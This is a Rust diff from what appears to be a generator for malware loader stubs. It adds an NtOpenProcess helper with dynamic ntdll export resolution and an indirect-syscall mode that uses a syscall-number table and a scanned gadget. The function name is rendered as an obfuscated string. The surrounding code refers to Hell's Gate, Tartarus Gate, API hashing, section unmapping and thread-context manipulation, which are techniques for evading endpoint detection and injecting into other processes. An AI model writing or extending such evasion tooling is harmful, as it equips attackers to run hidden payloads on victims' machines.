@@ -988,6 +988,67 @@ const CLOSE_INDIRECT: &str = r#"    /// NtClose(Handle).
 "#;
 
 /// Every Nt* function the stub can invoke, in canonical (rendering) order.
+/// `nt_open_process`, mode none.
+const OPEN_PROCESS_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type OpenProcessFn = unsafe extern "system" fn(
+        *mut core::ffi::c_void,
+        u32,
+        *const core::ffi::c_void,
+        *const core::ffi::c_void,
+    ) -> i32;
+
+    /// NtOpenProcess(&Handle, DesiredAccess, &ObjectAttributes, &ClientId). None
+    /// mode: resolve the export dynamically (windows-rs does not declare it) and
+    /// call it. `attributes` and `client_id` are opaque here.
+    pub fn nt_open_process(
+        handle: *mut core::ffi::c_void,
+        access: u32,
+        attributes: *const core::ffi::c_void,
+        client_id: *const core::ffi::c_void,
+    ) -> i32 {
+        let address = resolve_nt_export(&$OPEN_PROCESS_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let open: OpenProcessFn = unsafe { std::mem::transmute(address) };
+        unsafe { open(handle, access, attributes, client_id) }
+    }
+"#;
+
+/// `nt_open_process`, mode indirect.
+const OPEN_PROCESS_INDIRECT: &str = r#"    /// NtOpenProcess(&Handle, DesiredAccess, &ObjectAttributes, &ClientId).
+    pub fn nt_open_process(
+        handle: *mut core::ffi::c_void,
+        access: u32,
+        attributes: *const core::ffi::c_void,
+        client_id: *const core::ffi::c_void,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                handle as usize,
+                access as usize,
+                attributes as usize,
+                client_id as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.open_process,
+                *gadget,
+            )
+        }
+    }
+"#;
+
 const NT_FUNCTIONS: &[NtFunction] = &[
     NtFunction {
         name: "NtAllocateVirtualMemory",
@@ -1087,6 +1148,13 @@ const NT_FUNCTIONS: &[NtFunction] = &[
         helper_none: CLOSE_NONE,
         helper_indirect: CLOSE_INDIRECT,
     },
+    NtFunction {
+        name: "NtOpenProcess",
+        table_field: "open_process",
+        helper_name: "nt_open_process",
+        helper_none: OPEN_PROCESS_NONE,
+        helper_indirect: OPEN_PROCESS_INDIRECT,
+    },
 ];
 
 /// The Nt* function names the active techniques need, deduplicated and in the
@@ -1104,12 +1172,22 @@ pub fn required(pipeline: &[RuntimeStep]) -> Vec<&'static str> {
 
 /// The full [`NtFunction`] records the active techniques need.
 fn required_functions(pipeline: &[RuntimeStep]) -> Vec<&'static NtFunction> {
+    required_functions_with(pipeline, &[])
+}
+
+/// The full [`NtFunction`] records the active techniques plus any extra `Nt*`
+/// names need (e.g. the ones `build.stub.api_resolution` routes to).
+fn required_functions_with(
+    pipeline: &[RuntimeStep],
+    extra_nt: &[&'static str],
+) -> Vec<&'static NtFunction> {
     let mut needed: BTreeSet<&str> = BTreeSet::new();
     for step in pipeline {
         if let Some(def) = crate::techniques::find(step.name()) {
             needed.extend(def.syscalls.iter().copied());
         }
     }
+    needed.extend(extra_nt.iter().copied());
     NT_FUNCTIONS
         .iter()
         .filter(|f| needed.contains(f.name))
@@ -1140,12 +1218,26 @@ fn api_hash(name: &[u8]) -> u64 {
 /// - `mode: indirect`: the full syscall layer (SSN table, resolver — Hell's
 ///   Gate, Tartarus Gate or API hashing —, ASM trampoline, gadget scanner) plus
 ///   the helpers.
+///
+/// Convenience wrapper around [`render_block_with`] with no extra `Nt*` needs.
+#[allow(dead_code)]
 pub fn render_block(
     plan: &SyscallsConfig,
     pipeline: &[RuntimeStep],
     strings: &StringsConfig,
 ) -> String {
-    let required = required_functions(pipeline);
+    render_block_with(plan, pipeline, strings, &[])
+}
+
+/// Like [`render_block`], additionally pulling in the `Nt*` helpers the selected
+/// `build.stub.api_resolution` proxies route to.
+pub fn render_block_with(
+    plan: &SyscallsConfig,
+    pipeline: &[RuntimeStep],
+    strings: &StringsConfig,
+    extra_nt: &[&'static str],
+) -> String {
+    let required = required_functions_with(pipeline, extra_nt);
     if required.is_empty() {
         return assemble(
             "// --- Syscall layer ---\n// No active technique uses NT syscalls, so the layer is a no-op.",
@@ -1721,6 +1813,9 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
     let unmap_def = strings
         .obfuscate("NtUnmapViewOfSection")
         .render_stub_expr("unmap_func");
+    let open_process_def = strings
+        .obfuscate("NtOpenProcess")
+        .render_stub_expr("open_process_func");
     let query_def = strings
         .obfuscate("NtQueryInformationProcess")
         .render_stub_expr("query_info_name");
@@ -1741,6 +1836,7 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
     }
     out.replace("$NTDLL_DEF$", &ntdll_def)
         .replace("$UNMAP_FUNC_DEF$", &unmap_def)
+        .replace("$OPEN_PROCESS_FUNC_DEF$", &open_process_def)
         .replace("$QUERY_FUNC_DEF$", &query_def)
         .replace("$GET_CONTEXT_FUNC_DEF$", &get_context_def)
         .replace("$SET_CONTEXT_FUNC_DEF$", &set_context_def)
